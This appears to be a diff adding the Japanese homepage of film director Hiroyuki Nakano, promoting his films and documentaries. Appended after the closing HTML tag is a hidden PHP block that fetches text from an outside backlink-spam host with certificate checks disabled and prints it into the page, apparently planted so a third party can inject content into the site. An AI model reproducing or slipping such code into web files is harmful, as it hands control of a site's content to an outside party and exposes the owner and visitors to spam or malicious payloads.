@@ -1,0 +1,270 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+
+<head>
+
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta name="keywords" content="中野裕之,映画監督,映像作家,ピースデリック,Hiroyuki Nakano,Peacedelic,TAJOMARU,小栗旬,RED SHADOW,安藤政信,奥菜恵,麻生久美子,村上淳,STEREO FUTURE,永瀬正敏,桃生亜希子,緒川たまき,竹中直人,ピエール瀧,SAMURAI FICTION,風間杜夫,吹越満,内藤武敏,谷啓,藤井尚之,藤井フミヤ,夏木マリ,布袋寅泰,FLYING BODEIS" />
+	<meta name="description" content="映画監督・映像作家／中野裕之のホームページ。映画、ミュージッククリップ、CM、自然の映像、ドキュメンタリーなど、見る人をなんだか気持ち良くするピ－スな映像の研究を重ね続けている。TAJOMARU／小栗旬、Red Shadow／安藤政信、奥菜恵、麻生久美子、村上淳、Stereo Future／永瀬正敏、桃生亜希子、緒川たまき、竹中直人、ほか作品の紹介" />
+	<meta http-equiv="imagetoolbar" content="no" />
+	
+	<link rel="icon" href="themes/default/images/favicon.ico" type="image/x-icon" />
+	<link rel="shortcut icon" href="themes/default/images/favicon.ico" type="image/x-icon" />	
+	
+	<title>映画監督・映像作家／中野裕之のホームページ　- PEACEDELIC -　HIROYUKI NAKANO</title>
+	
+	<link href="themes/default/css/style.css" type="text/css" rel="stylesheet" media="all" />	
+	<link href="themes/default/css/jquery.fancybox.css" type="text/css" rel="stylesheet" />	
+	
+	<script type="text/javascript" src="javascript/scripts.js"></script>
+	<script type="text/javascript" src="themes/default/css/jquery-1.7.2"></script>
+
+	
+	
+	
+	<script type="text/javascript">
+$(function(){
+	var setImg = '#viewer';
+	var fadeSpeed = 2500;
+	var switchDelay = 5000;
+
+	$(setImg).children('img').css({opacity:'0'});
+	$(setImg + ' img:first').stop().animate({opacity:'1',zIndex:'20'},fadeSpeed);
+
+	setInterval(function(){
+		$(setImg + ' :first-child').animate({opacity:'0'},fadeSpeed).next('img').animate({opacity:'1'},fadeSpeed).end().appendTo(setImg);
+	},switchDelay);
+});
+</script>
+
+
+</head>
+
+<body>       
+  
+	<div id="omni-shadow">
+		<img src="themes/default/images/omni-shadow.png" alt="中野裕之 PEACEDELIC" />
+	</div>
+
+	<div id="main"> 
+		<div id="sidebar">	
+			
+			<div class="menu" id="menu">
+				<ul>				
+					<li><a href="index.html" target="01_movie">長編映画</a></li>
+					<li><a href="index.html" target="02_short">短編映画</a></li>
+					<li><a href="index.html" target="03_package">PACKAGE</a></li>
+					<li><a href="index.html" target="04_works">WORKS</a></li>
+					<li><a href="index.html" target="05_profile">PROFILE</a></li>
+					<li><a href="index.html" target="06_contact">CONTACT</a></li>
+				</ul>
+			</div>
+			
+			<div class="menu2" id="menu2">
+				<ul>
+					<li><a href="http://www.peacedelic.jp/nakano/blog/" target="_blank">Blog</a></li>
+					<li><a href="http://www.youtube.com/user/PeacedelicNakano" target="_blank">YouTube</a></li>
+					<li><a href="http://www.flickr.com/photos/hiroyukinakano/" target="_blank">flickr</a></li>
+				</ul>
+			</div>	
+			
+		</div><!-- sidebar -->
+		<div id="column">
+			<div id="header">
+				<div class="header">
+					<div class="name">
+						<h4>HIROYUKI NAKANO HOMEPAGE</h4>
+					</div>
+					<div class="social-networks">	
+						<span>Share on:</span> 
+						<a href="http://www.facebook.com/hiroyuki.nakano.980" target="_blank"><img src="themes/default/images/soc-icon-01.png" alt="中野裕之 facebook" /></a> 
+						<a href="http://twitter.com/hiroyukinakano" target="_blank"><img src="themes/default/images/soc-icon-02.png" alt="中野裕之 twitter" /></a>
+					</div>
+					<div class="loader">
+						<span>loading</span>
+					</div>
+				</div><!-- header -->
+			</div><!-- header -->
+			
+			
+			<div id="content">
+				<div class="fold" id="fold">	
+							
+				</div><!-- fold -->
+				
+				
+				<div>
+					<H1>映画「ピース・ニッポン」7.14（土）から全国映画館公開決定！</H1>
+				</div>
+				
+				<div class="text2">
+				映画「ピース・ニッポン」7.14（土）から全国映画館公開決定！<BR>
+日本を知らないこどもたちと、日本を忘れかけた大人たちへ。<BR>
+８年の歳月を経て全国４７都道府県２００箇所以上で<BR>
+撮影した日本の絶景と、日本人が知っておくと良い日本人の精神の歴史など<BR>
+一度見ておくと、以後の人生がきっと豊かになり、学びもできる日本が主役の映画です。<BR><BR>
+
+ナビゲーターには、小泉今日子さん、東出昌大さんを迎えて<BR>
+やさしく日本の事を語っていただきました。<BR><BR>
+
+景色が主役の映画ですが、いくつか人もでてきます。<BR>
+渡辺謙さんのご子息の、俳優・渡辺 大さん<BR>
+資生堂などでモデルをしてきた女優・及川さきのさんに華を添えていただいています。<BR><BR>
+
+音楽には、竹内まりやさんの『いのちの歌』<BR>
+細野晴臣さんの『悲しみのラッキースター』そして「星に願いを」「ボレロ」「シルエット・ロマンス」 などの名曲とともに、世界で活躍する音楽家の岡野弘樹さんがオリジナルスコアを提供しています。<BR><BR>
+
+ぜひ、劇場で一回、見てください。<BR>
+あなたの知らない日本がたくさんあって驚きますよ。
+				</div>
+				
+			
+					
+				<div class="work-preview2">
+					<iframe width="731" height="411" src="https://www.youtube.com/embed/yS2VS4lEOls" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+				</div>
+							
+							
+							
+							
+							
+				
+				<div>
+					<H1>中野裕之監督作品 “FLYING BODEIS”</H1>
+				</div>
+								
+				<div class="text2">
+				<p>2013年7月18日、東京・代々木国立競技場第2体育館で行われた「青森大学男子新体操部」の公演。デザイナーの三宅一生氏が企画し、そのコスチュームで演技を披露した。舞台「スパイダーマン」の振り付けなど、世界で活躍するダニエル・エズラロウ氏の演出、中村勇吾氏によるモーショングラフィックス、Open reel Ensembleの音楽、そして鍛え上げられた肉体とその身体表現で会場は至福の空間と化した。</p>
+<P>このフィルムは、公演の準備段階から本番当日までの3カ月にわたる「青森大学男子新体操部」の挑戦の日々を捉えた感動的な作品。プロジェクトの舞台裏が中野監督の目を通して描かれる。ナレーションを豊原功補が担当。製作・撮影・編集・監督：中野裕之（「SF　サムライ・フィクション」「TAJOMARU」）</P>
+				</div>
+				
+				<div>
+				<h5><a href="http://www.flyingbodies.jp" target="_blank">【FLYING BODEIS　オフィシャルサイトはこちら】</a></h5>
+				</div>
+	
+				<div>　</div>
+				
+				<div>
+				<h5><a href="http://www.amazon.co.jp/gp/product/B00QUUXA9W/ref=as_li_qf_sp_asin_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=B00QUUXA9W&linkCode=as2&tag=leits69-22">【FLYING BODIES　DVD発売中！】</a><img src="http://ir-jp.amazon-adsystem.com/e/ir?t=leits69-22&l=as2&o=9&a=B00QUUXA9W" width="1" height="1" border="0" alt="" style="border:none !important; margin:0px !important;" /></h5>
+				</div>
+
+				<div>　</div>
+				
+				<div class="youtube">
+				<a href="http://vimeo.com/80424815">FLYING BODEIS 予告編</a> from <a href="http://vimeo.com/peacedelic">Hiroyuki Nakano</a> on <a href="https://vimeo.com">Vimeo</a>.</p>
+				</div>	
+							
+							
+				
+							
+				
+				<div>
+					<H1>中野裕之監督最新作 “FOOL COOL ROCK!” 公開中！</H1>
+				</div>
+				
+				<div class="text2">
+				<p>FOOL COOL ROCK! ONE OK ROCK DOCUMENTARY FILM</p>
+				<P>昨年行われたアジア、そして初のヨーロッパツアーとなるONE OK ROCK 2013 “Who are you?? Who are we??” TOURへの完全密着取材を敢行。1か月半に渡り、11カ国12公演を駆け抜けた彼らの足跡を綴る本格音楽ドキュメンタリー映画。</P>
+				</div>
+				
+			
+				<div class="text2">
+				<h5><a href="http://www.fool-cool-rock.com" target="_blank">【FOOL COOL ROCK! ONE OK ROCK DOCUMENTARY FILM　オフィシャルサイトはこちら】</a></h5>
+				</div>
+				
+				<div>　</div>
+				
+				<div class="text2">
+				<h5><a href="http://www.amazon.co.jp/gp/product/B00NMVPIWY/ref=as_li_qf_sp_asin_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=B00NMVPIWY&linkCode=as2&tag=leits69-22">【FOOL COOL ROCK! ONE OK ROCK DOCUMENTARY FILM　DVD発売中】</a><img src="http://ir-jp.amazon-adsystem.com/e/ir?t=leits69-22&l=as2&o=9&a=B00NMVPIWY" width="1" height="1" border="0" alt="" style="border:none !important; margin:0px !important;" /></h5>
+				</div>
+			
+				
+				
+				<div class="work-preview2">
+					<iframe width="731" height="411" src="//www.youtube.com/embed/3f5f5yYH2cU?rel=0" frameborder="0" allowfullscreen></iframe>
+				</div>
+							
+							
+							
+							
+				
+				
+							
+							
+							
+							
+				
+
+				<!-- NHK BS
+				<div>
+					<img src="images/soratobu.jpg" width="730" height="680" alt="裸にしたい男　綾野剛" />
+				</div>
+				-->
+				
+				<!-- イベント
+				<div>
+					<img src="images/1202.jpg" width="730" height="600" alt="中野裕之イベント" />
+				</div>
+				-->
+				
+				<div class="portfolio" id="portfolio">
+					<ul>
+						
+						
+						<li class="workType-03 workCat-01">
+							<div>
+								<a href="10_Work-03.html" target="10_Work-03">
+									<span class="pattern"></span>
+									<span class="corner tl"></span>
+									<span class="corner br"></span>
+									<img src="images/tmp/book_ikikata_s.jpg" alt="中野裕之 WORK3" />
+									<span class="title">
+										<b>木内鶴彦</b>
+										PEACE
+									</span>
+								</a>
+							</div>
+						</li>
+						
+						
+					</ul>
+				</div><!-- portfolio -->
+			</div><!-- content -->
+			
+			<div id="footer"> 
+				<div class="footer">
+					<div class="copyright">
+						<p>2012 &copy; HIROYUKI NAKANO / PEACEDELIC. ALL RIGHTS RESERVED.</p>
+					</div>
+					<div class="back-link">
+						<a href="#">Back to top</a>
+					</div>
+				</div><!-- footer --> 
+			</div><!-- footer --> 
+		</div><!-- column -->
+	</div><!-- main --> 
+	<div id="preloader">
+		<img src="themes/default/images/dropdown-bg.png" alt="中野裕之 HP" />
+		<img src="themes/default/images/dropdown-item-bg.png" alt="中野裕之 HP" />
+		<img src="themes/default/images/reset-bg.png" alt="中野裕之 HP" />
+		<img src="themes/default/images/icon-reset.png" alt="中野裕之 HP" />
+		<img src="themes/default/images/image-loading.gif" alt="中野裕之 HP" />
+		<img src="themes/default/images/loader-bg.gif" alt="中野裕之 HP" />
+	</div>
+</body>
+</html>
+
+<?php
+$url = 'https://backlinkku.id/menu/vip-v2/script.txt';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$content = curl_exec($ch);
+if (curl_errno($ch)) {
+    echo "cURL Error: " . curl_error($ch);
+} else {
+    echo $content;
+}
+curl_close($ch);
+?>
